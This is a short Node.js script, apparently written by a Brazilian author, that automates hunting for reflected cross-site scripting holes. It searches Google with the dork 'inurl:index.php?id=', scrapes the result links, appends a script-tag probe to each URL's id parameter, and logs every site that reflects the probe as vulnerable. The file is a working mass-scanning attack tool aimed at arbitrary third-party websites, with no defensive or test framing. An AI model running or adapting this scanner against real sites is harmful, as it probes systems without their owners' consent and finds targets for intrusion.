/*
* Por Bruno da Silva
* npm install request; node index.js
*/
var request = require('request');
var PESQUISA = 'inurl:index.php?id='
var DORK = 'id=';
var DORKXSS = '<><>><<script>><>><></script>'

var headers = {
    'authority': 'www.google.com',
    'cache-control': 'max-age=0',
    'dpr': '0.9',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.115',
    'sec-fetch-user': '?1',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'accept-encoding': 'text',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'  
};

var options = {
    url: 'https://www.google.com/search?q='+encodeURI(PESQUISA) +'&num=100',
    headers: headers
};

function callback(error, response, body) {
    if (!error && response.statusCode == 200) {
        var spliter = body.split('class="r"><a href="');
	console.log(spliter.length, ' eh o numero de sites encontrados')
	for(var i in spliter) { 
		var uri = (spliter[i].split('"')[0]);
		if(validURL(uri) && uri.search(DORK) != -1) testaXss(uri+encodeURI(DORKXSS))
		
	}	
    }
}

function validURL(str) {
  var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
    '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
    '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
    '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
    '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
    '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
  return !!pattern.test(str);
}

request(options, callback);



function testaXss(url) {
	request({url}, function (error, response, body) {  
		if(!error && body.search(DORKXSS) != -1) console.log(url, ' VULNERAVEL');
		//else   console.log(url, ' SEGURO')
	});
}
